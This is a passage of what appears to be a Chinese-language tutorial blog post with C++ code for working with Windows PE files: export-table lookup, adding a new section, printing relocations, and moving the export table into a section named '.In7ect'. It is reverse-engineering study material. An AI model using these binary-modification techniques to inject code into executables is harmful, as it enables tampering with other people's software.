pExportDirectory-&gt;Name                   &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer) 将指向Dll文件名的RVAToFOA</span></span><br><span class="line">		<span class="comment">//FOA + (DWORD)pFileBuffer即为Dll文件名的字符串</span></span><br><span class="line">		<span class="built_in">printf</span>(       <span class="string">&quot;Dll文件名             = %s\n&quot;</span>, <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Base                   &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfFunctions     = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfFunctions      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfNames         = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfNames          &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfFunctions    = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfFunctions     &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNames        = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNames         &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNameOrdinals = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNameOrdinals  &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-FunctionsDetail-------------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-\t\t导出函数序号\t\tRVA\t\tFunctionName&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		DWORD *AddrFunctions = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfFunctions, pFileBuffer));</span><br><span class="line">		DWORD *AddrName = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNames, pFileBuffer));</span><br><span class="line">		WORD  *AddrOrdinals = (WORD  *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNameOrdinals, pFileBuffer));</span><br><span class="line">		DWORD i = <span class="number">0</span>;</span><br><span class="line">		DWORD j = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		DWORD a = (DWORD)Fun_Name;</span></span><br><span class="line"><span class="comment">		LPSTR* c = &amp;Fun_Name;</span></span><br><span class="line"><span class="comment">		DWORD b = RVAToFOA(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer;</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%x\n&quot;,Fun_Name);//输出Fun_Name中的值，即字符串的地址</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%p\n&quot;,Fun_Name);//输出Fun_Name中的值，而非Fun_Name地址，即字符串的地址</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%p\n&quot;,c);</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%x\n&quot;,b);</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%s\n&quot;,b);//将b的整数作为地址去找该地址指向的内容</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%s\n&quot;,Fun_Name);//输出同上一行</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pExportDirectory-&gt;NumberOfNames; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>((LPSTR)<span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer,Fun_Name))</span><br><span class="line">			&#123; </span><br><span class="line">				i = AddrOrdinals[j];</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;导出序号0x%x 对应的导出函数名为 %s ，该函数RVA为：%x\n&quot;</span>,AddrOrdinals[j] + pExportDirectory-&gt;Base,<span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer,AddrFunctions[i]);</span><br><span class="line">				<span class="keyword">return</span> (PDWORD)AddrFunctions[i];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;不存在该导出函数\n&quot;</span>);</span><br><span class="line">	<span class="comment">//return (PDWORD)AddrFunctions[i];</span></span><br><span class="line"></span><br><span class="line">	&#125;<span class="comment">//end else&#123;</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//end GetFunctionAddrByName(PVOID pFileBuffer, LPSTR fun_name)</span></span><br></pre></td></tr></table></figure>



<h2 id="E-AddNewSection"><a href="#E-AddNewSection" class="headerlink" title="E AddNewSection"></a>E AddNewSection</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">函数功能：在原PE文件中新增一个节，步骤：</span></span><br><span class="line"><span class="comment">1. 判断SizeOFHeader能否放下多余两个节区（一个新增节区，一个全0节区代表区块结束），分三种情况：</span></span><br><span class="line"><span class="comment"> （1）已有节表后直接可以放下两个节表 （2）条件满足（1），但是最后一个节表后面的数据非0x00则执行（3）；</span></span><br><span class="line"><span class="comment"> （3）节表后放不下，但是dos头后pe前可放下；（4）前两种情况都不行，需扩大最后一个节把代码填进去 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2. 本函数讨论第一种情况</span></span><br><span class="line"><span class="comment">1) 修改PE头中节的数量（NumberOfSections）</span></span><br><span class="line"><span class="comment">2) 修改sizeOfImage的大小</span></span><br><span class="line"><span class="comment">3) 修正新增节表的所有属性</span></span><br><span class="line"><span class="comment">4) 添加一个新的节表(可以copy一份然后修改)</span></span><br><span class="line"><span class="comment">5) 在新增节表后面填充一个节表大小的0x00</span></span><br><span class="line"><span class="comment">6）在原有数据的最后，新增一个节的数据(内存对齐的整数倍).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">参数1：新增节的大小。参数2：新增节的NewSection_FileBuffer。参数3：新增节的名字</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="comment">//参数为新增节的大小</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> IMAGE_SIZEOF_SECTION_HEADER</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_SIZEOF_SECTION_HEADER 40 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="function">VOID <span class="title">AddNewSection</span><span class="params">(DWORD Add_Section_Length,LPVOID* NewSection_FileBuffer,LPSTR Add_Section_Name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS32 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID pFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID pTempFileBuffer = <span class="literal">NULL</span>;<span class="comment">//新的FileBuffer，之后再写入新文件</span></span><br><span class="line"></span><br><span class="line">	pFileBuffer = <span class="built_in">ReadPEFile</span>(FILEPATH);</span><br><span class="line">	DWORD fileSize = <span class="built_in">ReadPESize</span>(FILEPATH);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;AddNewSection文件大小为：0x%x\n&quot;</span>,fileSize);</span><br><span class="line">	<span class="keyword">if</span>(pFileBuffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;文件 --&gt; 文件缓冲区失败&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	pTempFileBuffer = <span class="built_in">malloc</span>(fileSize + Add_Section_Length);</span><br><span class="line">	<span class="keyword">if</span>(pTempFileBuffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;临时文件缓冲区申请失败&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(pTempFileBuffer, <span class="number">0</span>, fileSize + Add_Section_Length);</span><br><span class="line">	<span class="built_in">memcpy</span>(pTempFileBuffer, pFileBuffer, fileSize);<span class="comment">//全部拷进去</span></span><br><span class="line"> </span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pTempFileBuffer;</span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS32)((BYTE *)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line"> </span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE *)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	<span class="comment">//保存text节的属性后面复制给新增节的属性</span></span><br><span class="line">	PIMAGE_SECTION_HEADER pText_Section = pSectionHeader;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断SizeOfHeaders - 已使用的头的大小 &gt;= 2*IMAGE_SIZEOF_SECTION_HEADER</span></span><br><span class="line">	<span class="comment">//#define  IMAGE_SIZEOF_SECTION_HEADER   40</span></span><br><span class="line">	<span class="comment">//已使用的头的大小 = DOS(0x3C + 0x4) + 垃圾数据 + PE标记(0x4) + 标准PE头(0x14) + 可选PE头</span></span><br><span class="line">	<span class="comment">//(pFileHeader-&gt;SizeOfOptionalHeader) + 已存在节表(pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER)</span></span><br><span class="line">	<span class="comment">//已使用的头的大小 = (DWORD)pSectionHeader - (DWORD)PIMAGE_DOS_HEADER + pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//已有节表后剩余的空间大小</span></span><br><span class="line">	DWORD Test = pOptionHeader-&gt;SizeOfHeaders - ((DWORD)pSectionHeader - (DWORD)pDosHeader + pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;已有节表后剩余的空间大小：%d\n&quot;</span>,Test);</span><br><span class="line">	<span class="keyword">if</span>(pOptionHeader-&gt;SizeOfHeaders - ((DWORD)pSectionHeader - (DWORD)pDosHeader + pFileHeader-&gt;NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER) &gt;= <span class="number">2</span>*IMAGE_SIZEOF_SECTION_HEADER)	</span><br><span class="line">	&#123;	<span class="comment">//应该还有一个判断条件就是最后一个节表后面的数据是否是0x00？</span></span><br><span class="line">		<span class="comment">//1) 修改PE头中节的数量（NumberOfSections）</span></span><br><span class="line">		pFileHeader-&gt;NumberOfSections = pFileHeader-&gt;NumberOfSections + <span class="number">1</span>;</span><br><span class="line">		<span class="comment">//2) 修改sizeOfImage的大小</span></span><br><span class="line">		pOptionHeader-&gt;SizeOfImage = pOptionHeader-&gt;SizeOfImage + Add_Section_Length;</span><br><span class="line">		<span class="comment">//将指针指向新增节表的首地址</span></span><br><span class="line">		pSectionHeader += pFileHeader-&gt;NumberOfSections - <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">	DWORD SizeOfData = <span class="number">0</span>;</span><br><span class="line">	DWORD MaxSize = <span class="number">0</span>;</span><br><span class="line"> 		</span><br><span class="line"> 		<span class="comment">//3）修正新增节表属性1--Name（总共9个属性）</span></span><br><span class="line">		<span class="built_in">strcpy</span>((<span class="keyword">char</span> *)pSectionHeader-&gt;Name, Add_Section_Name);</span><br><span class="line">		<span class="comment">//3）属性2--Misc.VirtualSize</span></span><br><span class="line">		pSectionHeader-&gt;Misc.VirtualSize = Add_Section_Length;</span><br><span class="line">		<span class="comment">//3）属性3--VirtualAddress，取Misc.VirtualSize与SizeOfRawData的最大值，且为pOptionHeader-&gt;SectionAlignment的倍数</span></span><br><span class="line">		MaxSize = (pSectionHeader - <span class="number">1</span>)-&gt;Misc.VirtualSize &gt; (pSectionHeader - <span class="number">1</span>)-&gt;SizeOfRawData?(pSectionHeader - <span class="number">1</span>)-&gt;Misc.VirtualSize:(pSectionHeader - <span class="number">1</span>)-&gt;SizeOfRawData;</span><br><span class="line">	<span class="keyword">if</span>(MaxSize % pOptionHeader-&gt;SectionAlignment == <span class="number">0</span>)&#123;</span><br><span class="line">		SizeOfData = MaxSize / pOptionHeader-&gt;SectionAlignment * pOptionHeader-&gt;SectionAlignment;<span class="comment">//不够一个块的取一个块的大小(如0x112/0x1000) + 0x1000 = 0x1000</span></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		SizeOfData = MaxSize / pOptionHeader-&gt;SectionAlignment * pOptionHeader-&gt;SectionAlignment + pOptionHeader-&gt;SectionAlignment;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//由于新增节数据是在已有的最后一个节后加的，故起始地址为上一个节的大小</span></span><br><span class="line">	pSectionHeader-&gt;VirtualAddress = (pSectionHeader - <span class="number">1</span>)-&gt;VirtualAddress + SizeOfData;</span><br><span class="line">	<span class="comment">//3）属性4--SizeOfRawData</span></span><br><span class="line">	pSectionHeader-&gt;SizeOfRawData = Add_Section_Length;</span><br><span class="line">	<span class="comment">//3）属性5--PointerToRawData</span></span><br><span class="line">	pSectionHeader-&gt;PointerToRawData = (pSectionHeader - <span class="number">1</span>)-&gt;PointerToRawData + (pSectionHeader - <span class="number">1</span>)-&gt;SizeOfRawData;</span><br><span class="line">	<span class="comment">//3）属性6--Characteristics</span></span><br><span class="line">	pSectionHeader-&gt;Characteristics = pText_Section-&gt;Characteristics;<span class="comment">//text节的属性，其余属性为0</span></span><br><span class="line"> </span><br><span class="line">	<span class="built_in">NewFileBufferToFile</span>(pTempFileBuffer,fileSize + Add_Section_Length,FilePath_Out);</span><br><span class="line">	&#125;</span><br><span class="line">	*NewSection_FileBuffer = pTempFileBuffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="F-Print-Relocation"><a href="#F-Print-Relocation" class="headerlink" title="F Print_Relocation"></a>F Print_Relocation</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************	</span></span><br><span class="line"><span class="comment">打印重定位表</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="function">BOOL <span class="title">Print_Relocation</span><span class="params">( LPVOID pFileBuffer )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS32 pNtHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_BASE_RELOCATION pBaseRelocation = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	DWORD Size = <span class="number">0</span>;</span><br><span class="line">	DWORD i = <span class="number">0</span>;</span><br><span class="line">	DWORD FOA=<span class="number">0</span>;</span><br><span class="line">	DWORD RVA=<span class="number">0</span>;</span><br><span class="line">	DWORD NumberOfRelocationAddress = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">//注意是两字节型的指针</span></span><br><span class="line">	PWORD pRelocation = <span class="literal">NULL</span>;<span class="comment">//指向重定位表中需要重定位的地址的指针</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pFileBuffer ==<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pFileBuffer缓冲区指针出错...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//判断是否含有有效MZ和PE标志</span></span><br><span class="line">	<span class="keyword">if</span>(*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的MZ标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">	<span class="keyword">if</span>(*((PDWORD)((BYTE *)pFileBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的PE标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pNtHeader = (PIMAGE_NT_HEADERS32)( (DWORD)pDosHeader + pDosHeader-&gt;e_lfanew );</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)( (DWORD)pNtHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)( (DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER );</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//pDataDirectory = (PIMAGE_DATA_DIRECTORY)&amp;pDataDirectory[5];</span></span><br><span class="line">	<span class="comment">//pBaseRelocation = (PIMAGE_BASE_RELOCATION)( (DWORD)pDosHeader + </span></span><br><span class="line">	<span class="comment">//ConvertRvaToFoa(pDataDirectory-&gt;VirtualAddress , pFileBuffer));</span></span><br><span class="line">	</span><br><span class="line">	pDataDirectory = (PIMAGE_DATA_DIRECTORY)pOptionHeader-&gt;DataDirectory ;</span><br><span class="line">	<span class="keyword">if</span>(pDataDirectory[<span class="number">5</span>].VirtualAddress == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;不存在基址重定位表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pBaseRelocation	= (PIMAGE_BASE_RELOCATION)( (DWORD)pDosHeader + <span class="built_in">RVAToFOA</span>( (&amp;pDataDirectory[<span class="number">5</span>])-&gt;VirtualAddress , pFileBuffer ) );<span class="comment">//第6个目录表（重定位表的目录）的地址，</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>(pBaseRelocation-&gt;VirtualAddress &amp;&amp; pBaseRelocation-&gt;SizeOfBlock)</span><br><span class="line">	&#123;</span><br><span class="line">		pRelocation = (PWORD)( (DWORD)pBaseRelocation + <span class="number">2</span> * <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD) );<span class="comment">//指向重定位表中的地址表，#define IMAGE_SIZEOF_BASE_RELOCATION 8	</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;***************************************************************************************\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAddress :%-10x&quot;</span>,pBaseRelocation-&gt;VirtualAddress );</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;SizeOfBlock :%-10X&quot;</span>,pBaseRelocation-&gt;SizeOfBlock );	</span><br><span class="line">		NumberOfRelocationAddress = (pBaseRelocation-&gt;SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION)/<span class="number">2</span> ;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NumberOfRelocationAddress :%-10X\n&quot;</span>, NumberOfRelocationAddress );</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;***************************************************************************************\n&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; Index			RVA                     Type                   Items\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">		DWORD j = <span class="number">0</span>;</span><br><span class="line">		DWORD x = <span class="number">0</span>;</span><br><span class="line">		DWORD y = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span> ; j&lt;NumberOfRelocationAddress ;j++)<span class="comment">//pRelocation++遍历重定位表中的地址表</span></span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">			x = (DWORD)pRelocation[j]&amp;<span class="number">0xfff</span>;</span><br><span class="line">			y = pBaseRelocation-&gt;VirtualAddress;</span><br><span class="line">			<span class="comment">//printf(&quot;%x			&quot;,x);</span></span><br><span class="line">			<span class="comment">//printf(&quot;%x			&quot;,y);</span></span><br><span class="line">			RVA = x + y;</span><br><span class="line">			<span class="comment">//最后一项如果为0，仅做对齐用</span></span><br><span class="line">			<span class="keyword">if</span>(x == <span class="number">0</span>)</span><br><span class="line">			&#123;	</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d			&quot;</span>, j + <span class="number">1</span> );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;-			&quot;</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%x			&quot;</span>, (pRelocation[j]&amp;<span class="number">0xf000</span>)&gt;&gt;<span class="number">12</span> );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d			&quot;</span>, NumberOfRelocationAddress );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//RVA = (DWORD)(pRelocation[j]&amp;0xfff + pBaseRelocation-&gt;VirtualAddress);</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d			&quot;</span>, j + <span class="number">1</span> );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%x			&quot;</span>,RVA);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%x			&quot;</span>, (pRelocation[j]&amp;<span class="number">0xf000</span>)&gt;&gt;<span class="number">12</span> );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d			&quot;</span>, NumberOfRelocationAddress );</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		Size +=pBaseRelocation-&gt;SizeOfBlock;</span><br><span class="line">		</span><br><span class="line">		pBaseRelocation = (PIMAGE_BASE_RELOCATION)( (DWORD)pBaseRelocation + pBaseRelocation-&gt;SizeOfBlock );<span class="comment">//遍历重定位表</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,Size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,(&amp;pDataDirectory[<span class="number">5</span>])-&gt;Size );</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="10-Move-Export-Table"><a href="#10-Move-Export-Table" class="headerlink" title="10 Move_Export_Table"></a>10 Move_Export_Table</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">	移动导出表</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="function">PDWORD <span class="title">Move_Export_Table</span><span class="params">(LPVOID pFileBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS32 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line">	LPSTR New_File_Name = <span class="string">&quot;C:/Move_Export_Table.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS32)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	<span class="comment">//pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + sizeof(DWORD)); </span></span><br><span class="line">	<span class="comment">//pOptionHeader = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">	pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;文件偏移为：%x\n&quot;</span>,<span class="built_in">RVAToFOA</span>(pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress,pFileBuffer));</span><br><span class="line">	<span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1）若在源文件上新增一个节并存放移动的导出表数据，该操作失败的话会导致源文件丢失</span></span><br><span class="line">	<span class="comment">//故新建一个TempFileBuffer来使用，包括移动后的导出表也在里面，且不会改变源文件</span></span><br><span class="line">	<span class="comment">//新建文件的大小 = 源文件大小 + 新增节的大小</span></span><br><span class="line">	<span class="comment">//新增节的大小：可由需要被移动节的大小计算得到。本例子指定为0x1000</span></span><br><span class="line">	DWORD Add_Section_Length = <span class="number">0x1000</span>;</span><br><span class="line">	LPVOID pTempFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//2）新增一个节表和全0x00的节数据	</span></span><br><span class="line">	<span class="comment">//节的名字为.In7ect</span></span><br><span class="line">	LPSTR Section_Name = <span class="string">&quot;.In7ect&quot;</span>;</span><br><span class="line">	<span class="built_in">AddNewSection</span>(Add_Section_Length,&amp;pTempFileBuffer,Section_Name);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pPEHeader_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DATA_DIRECTORY pDataDirectory_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExportDirectory_Temp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (!pTempFileBuffer)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(MoveExportTable)Can&#x27;t open file!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span 